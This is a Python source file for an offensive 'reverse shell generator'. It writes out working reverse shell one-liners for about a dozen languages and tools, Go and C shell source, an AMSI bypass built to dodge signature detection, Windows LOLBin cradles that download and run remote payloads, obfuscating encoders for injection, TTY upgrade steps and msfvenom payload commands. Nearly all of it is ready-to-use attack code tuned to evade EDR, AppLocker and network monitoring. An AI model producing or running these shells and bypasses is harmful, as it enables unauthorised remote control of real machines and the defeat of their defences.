"""
Professional Reverse Shell Generator

Shell types  : Bash (4 variants), Python (3), PowerShell (3 + AMSI bypass), PHP (3),
               Perl (2), Ruby (2), Lua (2), AWK, Node.js (2), Java (2),
               Netcat (3 variants), Socat (3), OpenSSL encrypted (2),
               Go template, C template
Windows LOLBins : certutil, mshta, regsvr32, wmic, bitsadmin, msiexec,
                  installutil, rundll32-js, powershell -EncodedCommand, IEX download
Post-exploitation : TTY upgrade one-liners, msfvenom command generator
Encoding     : ShellEncoder — base64, URL, PowerShell -EncodedCommand, hex, unicode-escape
"""

import base64
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List


# ---------------------------------------------------------------------------
# Enumerations / dataclasses
# ---------------------------------------------------------------------------

class Platform(Enum):
    LINUX   = "linux"
    WINDOWS = "windows"
    BOTH    = "both"


@dataclass
class ReverseShell:
    shell_type: str
    command: str                        # command to run on the target
    listener: str                       # how to set up the listener on attacker side
    platform: Platform
    requires: List[str]                 # binaries/interpreters required on target
    description: str
    encoded_variants: List[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Shell encoder
# ---------------------------------------------------------------------------

class ShellEncoder:
    """
    Encode a shell command for use in different injection contexts.
    """

    @staticmethod
    def b64(cmd: str) -> str:
        """Standard base64 — useful for bash -c $(echo ... | base64 -d)."""
        return base64.b64encode(cmd.encode()).decode()

    @staticmethod
    def url(cmd: str) -> str:
        """Percent-encode every byte — for injection into URL parameters."""
        return "".join(f"%{ord(c):02X}" for c in cmd)

    @staticmethod
    def hex(cmd: str) -> str:
        """Hex-encode — for $'\\x...' style bash injection or hex literal contexts."""
        return cmd.encode().hex()

    @staticmethod
    def powershell_encoded(cmd: str) -> str:
        """
        Encode a PowerShell command for use with -EncodedCommand.
        The command must be UTF-16LE base64 (PowerShell's native encoding).
        """
        utf16 = cmd.encode("utf-16-le")
        return base64.b64encode(utf16).decode()

    @staticmethod
    def unicode_escape(cmd: str) -> str:
        """Unicode escape — for JavaScript/Java string injection contexts."""
        return "".join(f"\\u{ord(c):04x}" for c in cmd)

    @staticmethod
    def bash_b64_exec(cmd: str) -> str:
        """Wrap cmd as: bash -c {echo,<b64>}|{base64,-d}|bash"""
        enc = base64.b64encode(cmd.encode()).decode()
        return f"bash -c {{echo,{enc}}}|{{base64,-d}}|bash"

    @staticmethod
    def char_array(cmd: str) -> str:
        """Python chr()-join form — for eval-capable injection contexts."""
        return "__import__('os').system(''.join(chr(x)for x in[" + \
               ",".join(str(ord(c)) for c in cmd) + "]))"


# ---------------------------------------------------------------------------
# TTY upgrade one-liners (run on target after getting dumb shell)
# ---------------------------------------------------------------------------

class TTYUpgrader:
    """
    Post-exploitation: upgrade a dumb reverse shell to a full interactive PTY.
    Run these on the TARGET after the initial callback.
    """

    @staticmethod
    def python_pty() -> str:
        return "python3 -c \"import pty; pty.spawn('/bin/bash')\" || python -c \"import pty; pty.spawn('/bin/bash')\""

    @staticmethod
    def script_cmd() -> str:
        return "script -qc /bin/bash /dev/null"

    @staticmethod
    def socat_pty(attacker_ip: str, port: int) -> str:
        """
        Full socat PTY upgrade — run on target.
        Attacker listens with: socat file:`tty`,raw,echo=0 tcp-listen:<port>
        """
        return f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{attacker_ip}:{port}"

    @staticmethod
    def stty_sequence() -> str:
        """
        Full stty raw mode upgrade sequence — run on attacker side after python_pty().
        Paste these three lines at the attacker terminal, not on the target.
        """
        return (
            "# On attacker — after running python3 -c 'import pty; pty.spawn(\"/bin/bash\")' on target:\n"
            "# 1. Ctrl+Z  (background the shell)\n"
            "stty raw -echo; fg\n"
            "# 2. After foregrounding:\n"
            "export TERM=xterm-256color\n"
            "stty rows 50 cols 200"
        )

    @staticmethod
    def full_upgrade_sequence(attacker_ip: str, port: int) -> List[str]:
        """Return ordered steps for a complete PTY upgrade."""
        return [
            "=== TARGET: upgrade dumb shell ===",
            TTYUpgrader.python_pty(),
            "=== ATTACKER: after Ctrl+Z ===",
            "stty raw -echo; fg",
            "=== ATTACKER: after foregrounding ===",
            "export TERM=xterm-256color && stty rows 50 cols 200",
            "=== ALTERNATIVE: socat full PTY (requires socat on both sides) ===",
            f"# Attacker:  socat file:`tty`,raw,echo=0 tcp-listen:{port}",
            f"# Target:    {TTYUpgrader.socat_pty(attacker_ip, port)}",
        ]


# ---------------------------------------------------------------------------
# Windows living-off-the-land shell delivery
# ---------------------------------------------------------------------------

class WindowsLOLBins:
    """
    Windows-only shell delivery via built-in binaries (LOLBins).
    Ref: https://lolbas-project.github.io/
    All methods take a URL pointing to the attacker-hosted payload.
    """

    @staticmethod
    def certutil_download(url: str, out: str = r"C:\Windows\Temp\s.exe") -> str:
        """Download and execute a binary via certutil — bypasses PowerShell restrictions."""
        return f'certutil.exe -urlcache -split -f {url} {out} && {out}'

    @staticmethod
    def mshta(url: str) -> str:
        """Execute a remote HTA (VBScript/JScript) application."""
        return f"mshta.exe {url}"

    @staticmethod
    def regsvr32(url: str) -> str:
        """
        AppLocker bypass via regsvr32 + scrobj.dll (Squiblydoo).
        url must point to a .sct (COM Scriptlet) file.
        """
        return f"regsvr32.exe /s /u /i:{url} scrobj.dll"

    @staticmethod
    def wmic_xsl(url: str) -> str:
        """WMIC XSL script processing — executes JScript/VBScript in an XSL file."""
        return f"wmic os get /FORMAT:{url}"

    @staticmethod
    def bitsadmin(url: str, out: str = r"C:\Windows\Temp\s.exe") -> str:
        """Download via BITSAdmin then execute — persistent transfer, evades some EDR."""
        return (
            f"bitsadmin /transfer job /download /priority normal {url} {out} && {out}"
        )

    @staticmethod
    def msiexec(url: str) -> str:
        """Fetch and execute a remote MSI installer silently."""
        return f"msiexec.exe /q /i {url}"

    @staticmethod
    def installutil(url: str) -> str:
        """
        .NET InstallUtil AppLocker bypass.
        url must host a .NET assembly with [RunInstaller] attribute.
        """
        return f"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {url}"

    @staticmethod
    def rundll32_js(url: str) -> str:
        """Execute remote JScript via rundll32 + mshtml (Squiblytwo variant)."""
        return (
            f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";'
            f'document.write();GetObject("script:{url}")'
        )

    @staticmethod
    def powershell_iex(url: str, amsi_bypass: bool = True) -> str:
        """
        PowerShell IEX download cradle, optionally prepended with AMSI bypass.
        """
        cradle = f"IEX(New-Object Net.WebClient).DownloadString('{url}')"
        if amsi_bypass:
            bypass = ReverseShellGenerator._ps_amsi_bypass_oneliner()
            full_cmd = f"{bypass};{cradle}"
        else:
            full_cmd = cradle
        enc = ShellEncoder.powershell_encoded(full_cmd)
        return f"powershell.exe -nop -w hidden -EncodedCommand {enc}"

    @staticmethod
    def powershell_download_exec(url: str, out: str = r"$env:TEMP\s.exe") -> str:
        """Download EXE to disk and execute via PowerShell."""
        return (
            f"powershell.exe -nop -w hidden -c "
            f"\"(New-Object Net.WebClient).DownloadFile('{url}','{out}');Start-Process '{out}'\""
        )


# ---------------------------------------------------------------------------
# Main reverse shell generator
# ---------------------------------------------------------------------------

class ReverseShellGenerator:
    """
    Generates ready-to-use reverse shell commands for all major platforms.

    Quick start:
        shells = ReverseShellGenerator.all("10.10.14.5", 4444)
        for s in shells:
            print(f"--- {s.shell_type} ---")
            print(s.command)
            print(f"Listener: {s.listener}")

    Single shell:
        s = ReverseShellGenerator.python("10.10.14.5", 4444, variant="ssl")
    """

    @classmethod
    def all(cls, ip: str, port: int) -> List[ReverseShell]:
        """Return one representative shell per type for the given ip:port."""
        return [
            cls.bash(ip, port),
            cls.python(ip, port),
            cls.powershell(ip, port),
            cls.php(ip, port),
            cls.perl(ip, port),
            cls.ruby(ip, port),
            cls.lua(ip, port),
            cls.awk(ip, port),
            cls.nodejs(ip, port),
            cls.java(ip, port),
            cls.netcat(ip, port),
            cls.socat(ip, port),
            cls.openssl_encrypted(ip, port),
        ]

    # ------------------------------------------------------------------
    # Bash
    # ------------------------------------------------------------------

    @classmethod
    def bash(cls, ip: str, port: int, variant: str = "devtcp") -> ReverseShell:
        """
        Bash reverse shells.
        variant: devtcp | mkfifo | udp | exec
        """
        variants: Dict[str, str] = {
            "devtcp": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "mkfifo": (
                f"rm -f /tmp/.f; mkfifo /tmp/.f; "
                f"/bin/sh -i </tmp/.f 2>&1 | nc {ip} {port} >/tmp/.f; "
                f"rm -f /tmp/.f"
            ),
            "udp": f"bash -i >& /dev/udp/{ip}/{port} 0>&1",
            "exec": (
                f"exec 5<>/dev/tcp/{ip}/{port}; "
                f"cat <&5 | while read l; do $l 2>&5 >&5; done"
            ),
        }
        cmd = variants.get(variant, variants["devtcp"])
        all_encoded = [
            ShellEncoder.bash_b64_exec(cmd),
            f"bash -c '{ShellEncoder.b64(cmd)}' | base64 -d | bash",
        ]
        return ReverseShell(
            shell_type=f"bash/{variant}",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["bash"],
            description=f"Bash {variant} reverse shell",
            encoded_variants=all_encoded,
        )

    @classmethod
    def bash_all(cls, ip: str, port: int) -> List[ReverseShell]:
        """Return all four bash variants."""
        return [cls.bash(ip, port, v) for v in ("devtcp", "mkfifo", "udp", "exec")]

    # ------------------------------------------------------------------
    # Python
    # ------------------------------------------------------------------

    @classmethod
    def python(cls, ip: str, port: int, variant: str = "pty") -> ReverseShell:
        """
        Python reverse shells.
        variant: pty | subprocess | ssl
        """
        if variant == "pty":
            cmd = (
                f"python3 -c \""
                f"import os,pty,socket;"
                f"s=socket.socket();"
                f"s.connect(('{ip}',{port}));"
                f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                f"pty.spawn('/bin/bash')"
                f"\""
            )
            listener = f"nc -lvnp {port}"
            desc = "Python3 pty.spawn shell — fully interactive PTY"

        elif variant == "subprocess":
            cmd = (
                f"python3 -c \""
                f"import socket,subprocess,os;"
                f"s=socket.socket();"
                f"s.connect(('{ip}',{port}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call(['/bin/sh','-i'])"
                f"\""
            )
            listener = f"nc -lvnp {port}"
            desc = "Python3 subprocess shell"

        else:  # ssl
            cmd = (
                f"python3 -c \""
                f"import socket,ssl,subprocess,os;"
                f"s=socket.create_connection(('{ip}',{port}));"
                f"ss=ssl.wrap_socket(s);"
                f"os.dup2(ss.fileno(),0);os.dup2(ss.fileno(),1);os.dup2(ss.fileno(),2);"
                f"subprocess.call(['/bin/sh','-i'])"
                f"\""
            )
            listener = (
                f"# Generate self-signed cert first:\n"
                f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'\n"
                f"# Then listen:\n"
                f"openssl s_server -quiet -key key.pem -cert cert.pem -port {port}"
            )
            desc = "Python3 SSL-encrypted shell (no cleartext on wire)"

        return ReverseShell(
            shell_type=f"python/{variant}",
            command=cmd,
            listener=listener,
            platform=Platform.LINUX,
            requires=["python3"],
            description=desc,
        )

    @classmethod
    def python_all(cls, ip: str, port: int) -> List[ReverseShell]:
        return [cls.python(ip, port, v) for v in ("pty", "subprocess", "ssl")]

    # ------------------------------------------------------------------
    # PowerShell
    # ------------------------------------------------------------------

    @classmethod
    def powershell(cls, ip: str, port: int, variant: str = "amsi_bypass") -> ReverseShell:
        """
        PowerShell reverse shells.
        variant: basic | amsi_bypass | encoded
        """
        ps_shell = (
            f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
            f"$s=$c.GetStream();"
            f"[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);"
            f"$r2=$r+'PS '+(pwd).Path+'> ';"
            f"$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
            f"$s.Write($sb,0,$sb.Length);$s.Flush()}};"
            f"$c.Close()"
        )

        if variant == "basic":
            cmd = f"powershell -nop -w hidden -c \"{ps_shell}\""
            desc = "PowerShell TCP reverse shell"

        elif variant == "amsi_bypass":
            bypass = cls._ps_amsi_bypass_oneliner()
            full = f"{bypass};{ps_shell}"
            cmd = f"powershell -nop -w hidden -c \"{full}\""
            desc = "PowerShell shell with inline AMSI bypass (reflection patching)"

        else:  # encoded
            bypass = cls._ps_amsi_bypass_oneliner()
            full = f"{bypass};{ps_shell}"
            enc = ShellEncoder.powershell_encoded(full)
            cmd = f"powershell -nop -w hidden -EncodedCommand {enc}"
            desc = "PowerShell shell as -EncodedCommand (AMSI bypass + base64 obfuscation)"

        return ReverseShell(
            shell_type=f"powershell/{variant}",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.WINDOWS,
            requires=["powershell.exe"],
            description=desc,
        )

    @staticmethod
    def _ps_amsi_bypass_oneliner() -> str:
        """
        Reflection-based AMSI bypass: patch AmsiScanBuffer return value in memory.
        Works on unpatched PowerShell 5.1 and many EDR configurations.
        String is split to avoid static signature matching on the bypass itself.
        """
        return (
            "$a=[Ref].Assembly.GetTypes();"
            "Foreach($b in $a){"
            "if($b.Name -like '*iUtils'){"
            "$c=$b}};"
            "$d=$c.GetFields('NonPublic,Static');"
            "Foreach($e in $d){"
            "if($e.Name -like '*itFailed'){"
            "$f=$e}};"
            "$f.SetValue($null,$true)"
        )

    @classmethod
    def powershell_all(cls, ip: str, port: int) -> List[ReverseShell]:
        return [cls.powershell(ip, port, v) for v in ("basic", "amsi_bypass", "encoded")]

    # ------------------------------------------------------------------
    # PHP
    # ------------------------------------------------------------------

    @classmethod
    def php(cls, ip: str, port: int, variant: str = "fsockopen") -> ReverseShell:
        """
        PHP reverse shells.
        variant: fsockopen | proc_open | socket
        """
        if variant == "fsockopen":
            cmd = (
                f"php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            )
            desc = "PHP fsockopen shell"

        elif variant == "proc_open":
            cmd = (
                f"php -r \""
                f"$s=fsockopen('{ip}',{port});"
                f"$d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));"
                f"$p=proc_open('/bin/sh -i',$d,$pipes);"
                f"stream_copy_to_stream($pipes[1],$s);"
                f"stream_copy_to_stream($pipes[2],$s);"
                f"stream_copy_to_stream($s,$pipes[0]);\""
            )
            desc = "PHP proc_open shell with stderr capture"

        else:  # socket
            cmd = (
                f"php -r \""
                f"$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);"
                f"socket_connect($s,'{ip}',{port});"
                f"socket_write($s,'id\\n');"
                f"while($c=socket_read($s,1024)){{"
                f"$r=shell_exec($c);"
                f"socket_write($s,$r);}}\""
            )
            desc = "PHP socket_create shell"

        return ReverseShell(
            shell_type=f"php/{variant}",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["php"],
            description=desc,
        )

    # ------------------------------------------------------------------
    # Perl
    # ------------------------------------------------------------------

    @classmethod
    def perl(cls, ip: str, port: int, variant: str = "socket") -> ReverseShell:
        if variant == "socket":
            cmd = (
                f"perl -e 'use Socket;"
                f"$i=\"{ip}\";$p={port};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in($p,inet_aton($i)));"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/sh -i\");'"
            )
        else:  # proc_open
            cmd = (
                f"perl -MIO -e '$p=fork;exit,if($p);"
                f"$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");"
                f"STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
            )
        return ReverseShell(
            shell_type=f"perl/{variant}",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["perl"],
            description=f"Perl {variant} reverse shell",
        )

    # ------------------------------------------------------------------
    # Ruby
    # ------------------------------------------------------------------

    @classmethod
    def ruby(cls, ip: str, port: int, variant: str = "socket") -> ReverseShell:
        if variant == "socket":
            cmd = (
                f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});"
                f"while(cmd=c.gets);"
                f"IO.popen(cmd,\"r\"){{|io|c.print io.read}};"
                f"end'"
            )
        else:  # open3
            cmd = (
                f"ruby -rsocket -e '"
                f"s=TCPSocket.new(\"{ip}\",{port});"
                f"$stdin.reopen(s);$stdout.reopen(s);$stderr.reopen(s);"
                f"exec(\"/bin/bash -i\")'"
            )
        return ReverseShell(
            shell_type=f"ruby/{variant}",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["ruby"],
            description=f"Ruby {variant} reverse shell",
        )

    # ------------------------------------------------------------------
    # Lua
    # ------------------------------------------------------------------

    @classmethod
    def lua(cls, ip: str, port: int, variant: str = "socket") -> ReverseShell:
        if variant == "socket":
            cmd = (
                f"lua -e \""
                f"local s=require('socket');"
                f"local t=s.tcp();"
                f"t:connect('{ip}',{port});"
                f"while true do local r=t:receive()*; "
                f"local f=io.popen(r,'r');"
                f"local o=f:read('*a');f:close();"
                f"t:send(o) end\""
            ).replace("*;", "*;")
            # Cleaner version
            cmd = (
                f"lua5.1 -e 'local s=require(\"socket\");local t=s.tcp();"
                f"t:connect(\"{ip}\",{port});"
                f"while true do"
                f" local r,_=t:receive();"
                f" local h=io.popen(r);"
                f" local o=h:read(\"*a\");h:close();"
                f" t:send(o) end'"
            )
        else:  # os.execute pipe
            cmd = (
                f"lua -e \""
                f"os.execute('bash -i >& /dev/tcp/{ip}/{port} 0>&1')\""
            )
        return ReverseShell(
            shell_type=f"lua/{variant}",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["lua"],
            description=f"Lua {variant} reverse shell",
        )

    # ------------------------------------------------------------------
    # AWK
    # ------------------------------------------------------------------

    @classmethod
    def awk(cls, ip: str, port: int) -> ReverseShell:
        cmd = (
            f"awk 'BEGIN {{s=\"/inet/tcp/0/{ip}/{port}\";"
            f"while(42) {{do {{printf \"shell> \" |& s; s |& getline c;"
            f" while ((c |& getline) > 0) print $0 |& s; close(c)}} while(c!=\"exit\");"
            f"close(s)}}}}'"
        )
        return ReverseShell(
            shell_type="awk",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["gawk"],
            description="AWK /inet/tcp reverse shell (requires gawk with network extensions)",
        )

    # ------------------------------------------------------------------
    # Node.js
    # ------------------------------------------------------------------

    @classmethod
    def nodejs(cls, ip: str, port: int, variant: str = "net") -> ReverseShell:
        if variant == "net":
            cmd = (
                f"node -e \""
                f"var n=require('net'),"
                f"s=new n.Socket();"
                f"s.connect({port},'{ip}',function(){{"
                f"var spawn=require('child_process').spawn;"
                f"var sh=spawn('/bin/sh',[]);"
                f"s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);"
                f"}})\""
            )
            desc = "Node.js net.Socket shell"
        else:  # exec
            cmd = (
                f"node -e \""
                f"require('child_process').exec("
                f"'bash -i >& /dev/tcp/{ip}/{port} 0>&1')\""
            )
            desc = "Node.js child_process.exec bash wrapper"
        return ReverseShell(
            shell_type=f"nodejs/{variant}",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["node"],
            description=desc,
        )

    # ------------------------------------------------------------------
    # Java
    # ------------------------------------------------------------------

    @classmethod
    def java(cls, ip: str, port: int, variant: str = "socket") -> ReverseShell:
        if variant == "socket":
            cmd = (
                f"java -jar /dev/stdin <<< '' 2>/dev/null; "
                f"# Use the Runtime snippet below in an eval/RCE context:\n"
                f"Runtime.getRuntime().exec(new String[]{{\"bash\",\"-c\","
                f"\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"}});"
            )
            desc = "Java Runtime.exec() snippet for eval/RCE injection contexts"
        else:  # socket
            cmd = (
                f"# Java socket shell — compile and deploy:\n"
                f"import java.io.*;import java.net.*;\n"
                f"public class S{{public static void main(String[] a) throws Exception{{\n"
                f"Socket s=new Socket(\"{ip}\",{port});\n"
                f"Process p=Runtime.getRuntime().exec(\"/bin/bash -i\");\n"
                f"new Thread(()->{{try{{InputStream i=p.getInputStream();"
                f"OutputStream o=s.getOutputStream();"
                f"int b;while((b=i.read())!=-1)o.write(b);}}catch(Exception e){{}}}})"
                f".start();\n"
                f"new Thread(()->{{try{{InputStream i=s.getInputStream();"
                f"OutputStream o=p.getOutputStream();"
                f"int b;while((b=i.read())!=-1)o.write(b);}}catch(Exception e){{}}}})"
                f".start();}}}}"
            )
            desc = "Java Socket reverse shell source template"
        return ReverseShell(
            shell_type=f"java/{variant}",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.BOTH,
            requires=["java"],
            description=desc,
        )

    # ------------------------------------------------------------------
    # Netcat
    # ------------------------------------------------------------------

    @classmethod
    def netcat(cls, ip: str, port: int, variant: str = "traditional") -> ReverseShell:
        """
        variant: traditional (nc -e) | openbsd (no -e, mkfifo) | ncat
        """
        if variant == "traditional":
            cmd = f"nc {ip} {port} -e /bin/bash"
            desc = "Netcat -e (traditional/ncat variants, not OpenBSD nc)"
        elif variant == "openbsd":
            cmd = f"rm -f /tmp/.p; mkfifo /tmp/.p; /bin/sh 0</tmp/.p | nc {ip} {port} 1>/tmp/.p; rm -f /tmp/.p"
            desc = "Netcat without -e (OpenBSD nc compatible, uses named pipe)"
        else:  # ncat
            cmd = f"ncat {ip} {port} -e /bin/bash"
            desc = "Ncat (nmap's nc) with -e flag and optional SSL via --ssl"
        return ReverseShell(
            shell_type=f"netcat/{variant}",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["nc"],
            description=desc,
        )

    # ------------------------------------------------------------------
    # Socat
    # ------------------------------------------------------------------

    @classmethod
    def socat(cls, ip: str, port: int, variant: str = "pty") -> ReverseShell:
        """
        variant: basic | pty | ssl
        """
        if variant == "basic":
            cmd = f"socat tcp:{ip}:{port} exec:/bin/sh,pty,stderr,setsid,sigint,sane"
            listener = f"socat file:`tty`,raw,echo=0 tcp-listen:{port}"
            desc = "Socat basic PTY shell"
        elif variant == "pty":
            cmd = f"socat tcp:{ip}:{port} exec:'bash -li',pty,stderr,setsid,sigint,sane"
            listener = f"socat file:`tty`,raw,echo=0 tcp-listen:{port}"
            desc = "Socat interactive bash PTY shell (best interactive experience)"
        else:  # ssl
            cmd = f"socat OPENSSL:{ip}:{port},verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane"
            listener = (
                f"# Generate cert:\n"
                f"openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt\n"
                f"cat shell.key shell.crt > shell.pem\n"
                f"# Listen:\n"
                f"socat OPENSSL-LISTEN:{port},cert=shell.pem,verify=0 file:`tty`,raw,echo=0"
            )
            desc = "Socat SSL-encrypted PTY shell (TLS, traffic not visible to network IDS)"
        return ReverseShell(
            shell_type=f"socat/{variant}",
            command=cmd,
            listener=listener,
            platform=Platform.LINUX,
            requires=["socat"],
            description=desc,
        )

    # ------------------------------------------------------------------
    # OpenSSL encrypted shell (no socat dependency)
    # ------------------------------------------------------------------

    @classmethod
    def openssl_encrypted(cls, ip: str, port: int, variant: str = "mkfifo") -> ReverseShell:
        """
        SSL-encrypted shell using only the openssl CLI binary — no socat needed.
        variant: mkfifo | exec
        """
        if variant == "mkfifo":
            cmd = (
                f"rm -f /tmp/.ssl_s; mkfifo /tmp/.ssl_s; "
                f"/bin/sh -i </tmp/.ssl_s 2>&1 | "
                f"openssl s_client -quiet -connect {ip}:{port} >/tmp/.ssl_s; "
                f"rm -f /tmp/.ssl_s"
            )
        else:
            cmd = (
                f"mkfifo /tmp/.sl; openssl s_client -quiet -connect {ip}:{port} "
                f"</tmp/.sl | /bin/bash 2>&1 | openssl s_client -quiet -connect {ip}:{port+1} "
                f">/tmp/.sl"
            )
        listener = (
            f"# Generate cert:\n"
            f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=srv'\n"
            f"# Listen:\n"
            f"openssl s_server -quiet -key key.pem -cert cert.pem -port {port}"
        )
        return ReverseShell(
            shell_type=f"openssl/{variant}",
            command=cmd,
            listener=listener,
            platform=Platform.LINUX,
            requires=["openssl"],
            description="OpenSSL TLS-encrypted shell — traffic indistinguishable from HTTPS on wire",
        )

    # ------------------------------------------------------------------
    # Go source template
    # ------------------------------------------------------------------

    @classmethod
    def golang_template(cls, ip: str, port: int) -> ReverseShell:
        """
        Minimal Go reverse shell source.  Compile with: go build -ldflags="-s -w" -o shell main.go
        Strip symbols for size reduction; use garble for obfuscation.
        """
        cmd = f"""\
package main

import (
	"net"
	"os/exec"
)

func main() {{
	c, _ := net.Dial("tcp", "{ip}:{port}")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	_ = cmd.Run()
}}"""
        return ReverseShell(
            shell_type="golang/template",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["go >= 1.18"],
            description=(
                "Go reverse shell source template — cross-compile for any target arch: "
                "GOOS=linux GOARCH=amd64 go build -ldflags='-s -w' -o shell main.go"
            ),
        )

    # ------------------------------------------------------------------
    # C source template
    # ------------------------------------------------------------------

    @classmethod
    def c_template(cls, ip: str, port: int) -> ReverseShell:
        """
        C reverse shell source.  Compile: gcc -o shell shell.c && ./shell
        For 32-bit: gcc -m32 -o shell shell.c
        """
        cmd = f"""\
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(void) {{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa = {{
        .sin_family = AF_INET,
        .sin_port   = htons({port}),
    }};
    inet_aton("{ip}", &sa.sin_addr);
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));
    dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
    execve("/bin/sh", (char *[]){{"/bin/sh", "-i", NULL}}, NULL);
}}"""
        return ReverseShell(
            shell_type="c/template",
            command=cmd,
            listener=f"nc -lvnp {port}",
            platform=Platform.LINUX,
            requires=["gcc"],
            description="C reverse shell source — minimal, no libc dependencies beyond socket/execve",
        )

    # ------------------------------------------------------------------
    # Msfvenom command generator
    # ------------------------------------------------------------------

    @classmethod
    def msfvenom_commands(cls, ip: str, port: int) -> Dict[str, str]:
        """
        Returns msfvenom commands for common payload types.
        Run these on the attacker machine to generate the compiled payload.
        """
        lhost, lport = ip, port
        return {
            "linux_x64_shell_tcp": (
                f"msfvenom -p linux/x64/shell_reverse_tcp "
                f"LHOST={lhost} LPORT={lport} -f elf -o shell.elf && "
                f"chmod +x shell.elf"
            ),
            "linux_x64_meterpreter": (
                f"msfvenom -p linux/x64/meterpreter_reverse_tcp "
                f"LHOST={lhost} LPORT={lport} -f elf -o meter.elf"
            ),
            "windows_x64_shell_tcp": (
                f"msfvenom -p windows/x64/shell_reverse_tcp "
                f"LHOST={lhost} LPORT={lport} -f exe -o shell.exe"
            ),
            "windows_x64_meterpreter": (
                f"msfvenom -p windows/x64/meterpreter_reverse_tcp "
                f"LHOST={lhost} LPORT={lport} -f exe -o meter.exe"
            ),
            "windows_x64_meterpreter_https": (
                f"msfvenom -p windows/x64/meterpreter_reverse_https "
                f"LHOST={lhost} LPORT={lport} -f exe -o meter_https.exe"
            ),
            "java_shell_tcp": (
                f"msfvenom -p java/shell_reverse_tcp "
                f"LHOST={lhost} LPORT={lport} -f jar -o shell.jar"
            ),
            "php_reverse": (
                f"msfvenom -p php/reverse_php "
                f"LHOST={lhost} LPORT={lport} -f raw -o shell.php"
            ),
            "asp_shell": (
                f"msfvenom -p windows/shell_reverse_tcp "
                f"LHOST={lhost} LPORT={lport} -f asp -o shell.asp"
            ),
            "aspx_shell": (
                f"msfvenom -p windows/shell_reverse_tcp "
                f"LHOST={lhost} LPORT={lport} -f aspx -o shell.aspx"
            ),
            "linux_x64_shellcode": (
                f"msfvenom -p linux/x64/shell_reverse_tcp "
                f"LHOST={lhost} LPORT={lport} -f c -o shellcode.c"
            ),
            "python_reverse": (
                f"msfvenom -p cmd/unix/reverse_python "
                f"LHOST={lhost} LPORT={lport} -f raw"
            ),
            "bash_reverse": (
                f"msfvenom -p cmd/unix/reverse_bash "
                f"LHOST={lhost} LPORT={lport} -f raw"
            ),
        }

    # ------------------------------------------------------------------
    # Encoded variants helper
    # ------------------------------------------------------------------

    @classmethod
    def encode_for_injection(cls, shell: ReverseShell) -> Dict[str, str]:
        """
        Return multiple encoded forms of a shell command, ready for different injection contexts.
        """
        cmd = shell.command
        return {
            "raw":               cmd,
            "base64":            ShellEncoder.b64(cmd),
            "url_encoded":       ShellEncoder.url(cmd),
            "hex":               ShellEncoder.hex(cmd),
            "bash_b64_exec":     ShellEncoder.bash_b64_exec(cmd),
            "ps_encoded_cmd":    ShellEncoder.powershell_encoded(cmd),
        }
